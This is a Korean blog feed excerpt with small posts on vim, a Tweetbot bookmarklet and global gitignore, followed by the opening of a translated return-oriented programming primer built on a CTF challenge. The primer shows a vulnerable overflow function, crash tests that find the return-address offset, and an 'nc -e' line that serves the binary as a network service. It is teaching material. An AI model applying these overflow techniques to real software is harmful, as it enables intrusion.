</span><span class='line'>autocmd <span class="nb">InsertEnter</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">//</span>
</span><span class='line'>autocmd <span class="nb">InsertLeave</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">/\s\+$/</span>
</span><span class='line'><span class="k">if</span> <span class="k">version</span> <span class="p">&gt;=</span> <span class="m">702</span>
</span><span class='line'>  autocmd <span class="nb">BufWinLeave</span> * <span class="k">call</span> clearmatches<span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Twitter Link Bookmarklet &rarr;]]></title>
    <link href="http://yous.be/2014/03/27/twitter-link-bookmarklet/"/>
    <updated>2014-03-27T10:18:57+09:00</updated>
    <id>http://yous.be/2014/03/27/twitter-link-bookmarklet</id>
    <content type="html"><![CDATA[<p><a href="http://davebradford.com/about/">Dave Bradford</a>의 트위터에 관한 팁 <a href="http://davebradford.com/blog/twitter-profile-bookmarklet/">Twitter Profile Bookmarklet</a>을 봤다. 직접 써 보니 기능이 추가됐으면 더 좋을 것 같아 추가했다.</p>

<p>일단, 원글에 있는 코드의 기능은 간단하다. 모바일 사파리를 통해 트위터 계정을 보다가 북마크 버튼을 한 번 누르면 <a href="http://tapbots.com/software/tweetbot/">Tweetbot</a>에서 볼 수 있게 된다. 여기에 브라우저를 통해 &lsquo;트윗&#8217;을 보고 있다면 Tweetbot으로 바로 그 트윗을 볼 수 있게 기능을 추가했다. OS X에서도 동일하게 작동한다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">match</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/status(?:es)?\/(\d+)/i</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">tweetbotUrl</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">match</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">tweetbotUrl</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/https?:\/\/(mobile\.)?twitter\.com\//</span><span class="p">,</span> <span class="s2">&quot;tweetbot:///user_profile/&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">tweetbotUrl</span> <span class="o">=</span> <span class="s2">&quot;tweetbot:///status/&quot;</span> <span class="o">+</span> <span class="nx">match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">tweetbotUrl</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>원리는 간단하다. 현재 페이지 URL에 <code>status</code>나 <code>statuses</code>가 포함되어 있으면 트윗을 열고, 그렇지 않으면 계정을 보여 준다. 아래 코드를 북마크 해두고, 필요할 때 눌러주면 된다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>javascript:var%20url=document.URL;var%20match=url.match(/status(?:es)?%5C/(%5Cd+)/i);var%20tweetbotUrl;if(match==null)%7BtweetbotUrl=url.replace(/https?:%5C/%5C/(mobile%5C.)?twitter%5C.com%5C//i,%22tweetbot:///user_profile/%22)%7Delse%7BtweetbotUrl=%22tweetbot:///status/%22+match[1]%7Dwindow.location=tweetbotUrl;</span></code></pre></td></tr></table></div></figure>


<p>기기에 Tweetbot 2와 Tweetbot 3가 모두 깔려 있을 때 Tweetbot 2로 열리는 점은 아쉽다.</p>

<p>via <a href="http://yoonjiman.net/2014/03/25/twitter-profile-bookmarklet/">Yoon Jiman</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Global Git Ignore &rarr;]]></title>
    <link href="http://yous.be/2014/03/25/global-git-ignore/"/>
    <updated>2014-03-25T20:49:32+09:00</updated>
    <id>http://yous.be/2014/03/25/global-git-ignore</id>
    <content type="html"><![CDATA[<p><a href="http://usevim.com">usevim</a>의 <a href="http://twitter.com/#!/alex_young">Alex Young</a>이 쓴 <a href="http://usevim.com/2013/10/04/gitglobal-ignore/">global gitignore에 관한 글</a>이다.</p>

<blockquote><p>나는 몇 년간 <code>.gitignore</code>에 <code>*.sw?</code>을 넣어 왔는데, Vim을 쓰지 않는 사람들은 특정 편집기를 위한 <code>.gitignore</code> 항목을 보고 싶지 않아 할 수도 있다는 걸 깨달았다. 편집기들은 임시 파일과 복구 파일을 각자 다른 방식으로 관리하기 때문에 이 설정을 모두에게 강요하는 것은 과해 보인다.</p>

<p>이것보단 global 옵션을 사용하는 것이 낫다. <code>git config --global core.excludesfile ~/.gitignore</code>를 실행해라. 그러면 거기에 <code>*.sw?</code>을, 어쩌면 <code>*~</code>도 넣을 수 있다. 난 <code>.DS_Store</code>를 추가할 텐데, Windows 개발자들은 여기 신경 쓸 필요가 없기 때문이다. 그리고 그들은 아마 <code>Thumbs.db</code>를 추가해야 할 것이다.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ropasaurusrex: return-oriented programming 입문서 &rarr;]]></title>
    <link href="http://yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming/"/>
    <updated>2014-03-19T20:44:03+09:00</updated>
    <id>http://yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming</id>
    <content type="html"><![CDATA[<p><a href="https://blog.skullsecurity.org">SkullSecurity</a>의 <a href="https://blog.skullsecurity.org/author/ron">Ron Bowes</a>가 쓴 <a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming">return-oriented programming 입문서</a>가 있어 번역했다.</p>

<!-- more -->


<hr />

<p>CTF 대회 중 가장 기분이 나쁠 때는 <a href="http://knowyourmeme.com/memes/captain-hindsight">나중에 깨닫는</a> 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">cnot</a>에 쓴 시간에 비할 바는 아니지만&mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 바로 ROP다!</p>

<p>어쨌든, 잘못된 방법으로 많은 시간을 썼음에도 불구하고 (특히, 한동안 <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>을 우회할 생각은 하지 않았다), 우리가 이 문제를 풀기까지 거쳤던 과정(ASLR을 고려하지 않고, 그 다음은 ASLR을 고려해서)은 설명하기 좋은 방법이므로 이 글에서도 같은 방법을 사용하겠다.</p>

<p>먼저, 이 글에서 파트너가 되어 준 HikingPete에게 감사하고 싶다. 그 덕분에 우리는 이 퍼즐을 훨씬 빨리 풀 수 있었고, 잠깐 동안 세계 3위를 차지했다!</p>

<p>우연히, 난 한동안 <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>에 대한 글을 쓸 셈이었다. 심지어 기초가 될 취약한(vulnerable) 데모 프로그램까지 만들고 있었다! 하지만 PlaidCTF에서 문제가 나왔으니 그 데모 대신 이 문제에 대해 말하겠다! 이건 단순한 문제 풀이(writeup)가 아니고, 상당히 상세한 return-oriented programming 입문서가 될 것이다! 만약 CTF 문제를 푸는 과정이 더 궁금하다면, <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">내 cnot writeup</a>을 보라. :)</p>

<h2><a id="what-the-heck-is-rop"></a>도대체 ROP가 뭐야?</h2>

<p>ROP&mdash;return-oriented programming&mdash;는 고전적 익스플로잇(exploit) &ldquo;<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return into libc</a>&#8220;를 나타내는 현대 용어다. 이 아이디어는 프로그램을 마음대로 조종할 수 있는 오버플로(overflow)나 다른 유형의 취약점을 발견했지만, 코드를 실행 가능한 메모리 영역(executable memory)에 올릴 수 있는 확실한 방법이 없을 때(<a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a>, 데이터 실행 방지(Data Execution Prevention), 사용자가 원하는 곳에서부터 코드를 실행시킬 수 없다)를 위한 것이다.</p>

<p>ROP를 이용하면 실행 가능한 메모리 영역(executable memory)에 이미 있는 코드 중 &lsquo;<a href="https://en.wikipedia.org/wiki/Return_statement">return</a>&#8216;으로 끝나는 조각들을 고를 수 있다. 그 조각들이 간단할 때도 있고, 복잡할 때도 있다. 다행히도 이 예제에서 우리는 간단한 것들만 필요하다!</p>

<p>하지만 우린 너무 앞서나가고 있다. 일단 <a href="https://en.wikipedia.org/wiki/Call_stack">스택(stack)</a>에 대해 좀 더 배워보자! 스택을 설명하는 데에 <em>엄청난</em> 시간을 쓰지는 않을 것이니, 잘 모르겠다면 <a href="https://blog.skullsecurity.org/wiki/index.php/The_Stack">내 어셈블리(assembly) 튜토리얼</a><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>을 보라.</p>

<h2><a id="the-stack"></a>스택</h2>

<p>스택에 관해 한 번쯤은 들어보았을 것이다. <a href="https://en.wikipedia.org/wiki/Stack_overflow">스택 오버플로(stack overflow)</a>? 스택 깨뜨리기(smashing the stack)? 하지만 그게 무슨 뜻인가? 이미 알고 있다면, 이걸 간단한 입문서 정도로 생각하거나 바로 다음 섹션으로 넘어가라. 당신 마음대로!</p>

<p>이 간단한 아이디어를 설명하자면, 함수 <code>A()</code>가 함수 <code>B()</code>를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 <code>B()</code>는 <code>C()</code>를 두 개의 인자 3, 4와 함께 호출한다고 하자. <code>C()</code>가 실행 중일 때, 스택은 이렇게 보일 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          | (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 'A'의 스택 프레임 시작
</span><span class='line'>|   [return address]   | &lt;-- 'A'를 호출한 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|   [frame pointer]    |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [local variables]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 'B'의 스택 프레임 시작
</span><span class='line'>|         2 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|         1 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- 'B'가 반환되는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|   [frame pointer]    |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [local variables]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 'C'의 스택 프레임 시작
</span><span class='line'>|         4 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|         3 (parameter)|
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- 'C'가 반환되는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          | (낮은 주소)
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>당신이 이 수준에서 숨쉬듯이 생각하는 사람이 아니라면 이건 꽤 어려운 (눈을 끄는?) 것이기 때문에 조금 설명하도록 하겠다. 매번 당신이 함수를 호출할 때, 새로운 &ldquo;스택 프레임&#8221;이 만들어진다. &#8220;프레임&#8221;은 단순히 말해 함수가 자신을 위해 스택에 할당한 메모리다. 사실은 할당조차 하지 않으며, 그저 끝에 뭔가 추가하고 <code>esp</code> 레지스터를 업데이트 한다. 그러면 이것이 호출하는 모든 함수는 자신의 스택 프레임이 어디에서 시작해야 하는지 알게 된다(<code>esp</code>, 스택 포인터이며 이는 기본적으로 변수다).</p>

<p>이 스택 프레임은 현재 함수의 상태(context)를 담고 있고, 당신이 쉽게 a) 새로 불린 함수의 프레임을 만들고, b) 이전 프레임으로 돌아갈 수 있게 한다 (예를 들어, 함수에서 반환한 경우). <code>esp</code>(스택 포인터)는 위아래로 움직이지만 항상 스택의 시작점(가장 낮은 주소)을 가리킨다.</p>

<p>다른 함수를 호출했을 때 원래 함수의 지역 변수들은 어디로 가는지 궁금한 적이 있는가 (더 좋게는, 같은 함수를 재귀적으로 한 번 더 호출할 때)? 당연히 없을 것이다! 하지만 생각해 봤다면, 이미 알고 있을 것이다: 우리가 다시 돌아올 예전 스택 프레임에 머무른다!</p>

<p>이제 스택에 무엇이 저장되어 있는지 스택에 들어간 순서대로 보자 (헷갈리지만, 스택을 다른 방법으로 그릴 수도 있다; 이 글에서는 스택이 위에서 아래로 늘어나기에 오래된/호출하는 함수는 위에, 새로운/호출된 함수는 아래에 있다):</p>

<ul>
<li>인자(Parameters): 호출한 함수가 넘긴 인자들&mdash;ROP에서 <em>대단히</em> 중요하다.</li>
<li>반환 주소(Return address): 모든 함수는 자신이 끝나면 어디로 가야 하는지 알아야 한다. 당신이 함수를 호출하면, 그 함수에 진입하기 앞서 호출 직후의 명령어(instruction) 주소가 스택에 들어간다. 반환하는 순간, 그 주소를 스택에서 뽑고, 그리로 점프한다. 이건 ROP에서 대단히 중요하다.</li>
<li>프레임 포인터(Saved frame pointer): 이건 완전히 무시하자. 정말로. 이건 예외는 있지만 컴파일러가 일반적으로 하는 일이고, 이에 대해 다시 언급하지는 않을 것이다.</li>
<li>지역 변수(Local variables): 함수는 지역 변수를 저장하기 위해 필요한 만큼 (적당한 범위 내에서) 메모리를 할당할 수 있다. 지역 변수는 여기서 시작한다. ROP와는 전혀 관계 없으며 무시해도 안전하다.</li>
</ul>


<p>그래서, 요약하자면: 함수가 호출되면 인자들이 스택에 들어가고, 그 뒤에 반환 주소가 들어간다. 함수가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 스택에 들어갔던 인자들은 <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">호출하는 함수에 의해 지워지지만</a>, <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall">예외</a>도 있다. 우리는 호출하는 함수가 인자를 지운다고 가정하자. 즉, 호출된 함수가 자신의 인자를 지우지 않는다고 가정하자. 이건 이 문제가 (그리고 Linux 대부분의 역사에서) 그렇게 동작하기 때문이다.</p>

<h2><a id="heaven-hell-and-stack-frames"></a>천국, 지옥 그리고 스택 프레임</h2>

<p>ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 스택 프레임은 그 함수의 온 우주라는 것이다. 스택은 함수의 신이고, 인자는 성경의 십계명이고, 지역 변수는 죄며, 프레임 포인터는 성경이고 반환 주소는 천국이다 (그래, 지옥일 수도 있다). 모든 건 <a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">인텔의 책</a>, 3장, 19-26구절에 있다 (주: 사실 아니니 보는 수고는 하지 마라).</p>

<p>당신이 <code>sleep()</code> 함수를 호출하고, 첫 라인에 왔다고 하자; 그 스택 프레임은 이렇게 생겼을 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>|      [seconds]       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- esp는 여기를 가리킨다.
</span><span class='line'>+----------------------+
</span><span class='line'>          ...            &lt;-- 할당되지 않았다, 영역은 상관 없다. (낮은 주소)</span></code></pre></td></tr></table></div></figure>


<p><code>sleep()</code>이 시작하는 순간, 스택 프레임은 지금 보이는 게 다다. 이 스택 프레임은 프레임 포인터를 저장할 수도 있고 (젠장, 말 안 하기로 해 놓고 두 번이나 말해버렸다; 다시는 언급하지 않을 것을 맹세한다) <code>esp</code>에서 몇 바이트 뺌으로써 (즉, <code>esp</code> 포인터를 더 낮은 주소로 만듦으로써) 지역 변수를 위한 공간을 확보할 수도 있다. <code>esp</code> 아래에 새 프레임을 만드는 다른 함수를 호출할 수도 있다. 이 스택 프레임은 여러 가지 다양한 일을 할 수 있다; 그게 무엇인지 간에, <code>sleep()</code>이 시작하면, 스택 프레임은 이 함수의 세계를 만들어낸다.</p>

<p><code>sleep()</code>이 반환하면, 결국 이렇게 생겼을 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>|      [seconds]       | &lt;-- esp는 여기를 가리킨다.
</span><span class='line'>+----------------------+
</span><span class='line'>| [old return address] | &lt;-- 할당되지 않았다, 영역은 상관 없다. 이제 여기부터 시작한다.
</span><span class='line'>+----------------------+
</span><span class='line'>          ...            (낮은 주소)</span></code></pre></td></tr></table></div></figure>


<p>당연히 호출한 함수는 <code>sleep()</code>이 반환하고 나면 <code>esp</code>에 4를 더해 &ldquo;seconds&#8221;를 스택에서 지운다 (나중에 똑같은 일을 하기 위해 어떻게 <code>pop/pop/ret</code>을 사용해야 하는지 이야기할 것이다).</p>

<p>제대로 동작하는 시스템에서는, 이게 작동 원리다. 안전한 전제다. &ldquo;seconds&rdquo; 값은 스택에 들어갔을 때 스택에만 있을 것이고, 반환 주소는 호출된 장소를 가리키고 있을 것이다. 그럼, 그럼. 달리 어떤 방법으로 그리 갈 수 있을까?</p>

<h2><a id="controlling-the-stack"></a>스택 주무르기</h2>

<p>&hellip;뭐, 당신이 궁금해 하니 말하겠다. 우리 모두 &ldquo;스택 오버플로&#8221;에 대해 들어봤다. 그건 스택에 있는 변수를 덮어쓰는 것과 관련이 있다. 그게 무슨 뜻이냐? 뭐, 이런 스택 프레임이 있다고 하자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>|      [seconds]       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- esp는 여기를 가리킨다.
</span><span class='line'>+----------------------+
</span><span class='line'>|     char buf[16]     |
</span><span class='line'>|                      |
</span><span class='line'>|                      |
</span><span class='line'>|                      |
</span><span class='line'>+----------------------+
</span><span class='line'>          ...            (낮은 주소)</span></code></pre></td></tr></table></div></figure>


<p>변수 <code>buf</code>의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, <code>buf[16]</code>)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&mdash;<a href="https://en.wikipedia.org/wiki/Endianness">리틀 엔디언</a>&mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. <em>원하는 곳 어디든</em>. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&mdash;완벽한 세계에서는, 그럴 것이다&mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 <a href="https://en.wikipedia.org/wiki/Zero_page">0</a>으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 <code>0x41414141</code>(&ldquo;AAAA&rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&hellip; 음, 이건 좀 복잡해진다&hellip;</p>

<h2><a id="dep"></a>DEP</h2>

<p>전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&mdash;그렇지 않으면, 크래시를 일으킨다.</p>

<p>그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?</p>

<p>음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!</p>

<h2><a id="the-vulnerability"></a>취약점</h2>

<p>여기 IDA에서 갓 뽑은 취약한 함수다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:080483F4vulnerable_function proc near
</span><span class='line'>.text:080483F4
</span><span class='line'>.text:080483F4buf             = byte ptr -88h
</span><span class='line'>.text:080483F4
</span><span class='line'>.text:080483F4         push    ebp
</span><span class='line'>.text:080483F5         mov     ebp, esp
</span><span class='line'>.text:080483F7         sub     esp, 98h
</span><span class='line'>.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
</span><span class='line'>.text:08048405         lea     eax, [ebp+buf]
</span><span class='line'>.text:0804840B         mov     [esp+4], eax    ; buf
</span><span class='line'>.text:0804840F         mov     dword ptr [esp], 0 ; fd
</span><span class='line'>.text:08048416         call    _read
</span><span class='line'>.text:0804841B         leave
</span><span class='line'>.text:0804841C         retn
</span><span class='line'>.text:0804841Cvulnerable_function endp</span></code></pre></td></tr></table></div></figure>


<p>어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">ssize_t</span> <span class="kr">__cdecl</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>256바이트를 읽어 136바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!</p>

<p>이걸 실행함으로써 쉽게 확인할 수 있다. &lsquo;A&rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x300&quot;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(<code>0x41414141</code>=&ldquo;AAAA&rdquo;)로 덮어썼다는 말이다.</p>

<p>이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &ldquo;BBBB&#8221;를 넣고 <code>0x42424242</code>(&#8220;BBBB&rdquo;)에서 크래시를 일으킬 때까지 &lsquo;A&#8217;를 지웠다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>이걸 좀 더 &ldquo;잘&rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb">pattern_create.rb</a>와 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb">pattern_offset.rb</a>를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.</p>

<h2><a id="starting-to-write-an-exploit"></a>익스플로잇 제작 시작하기</h2>

<p>가장 먼저 해야 할 일은 <code>ropasaurusrex</code>를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 <a href="https://en.wikipedia.org/wiki/Xinetd">xinetd</a>를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>을 쓸 것이다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>nc -vv -l -p 4444 -e ./ropasaurusrex<span class="p">;</span> <span class="k">done</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
</span></code></pre></td></tr></table></div></figure>


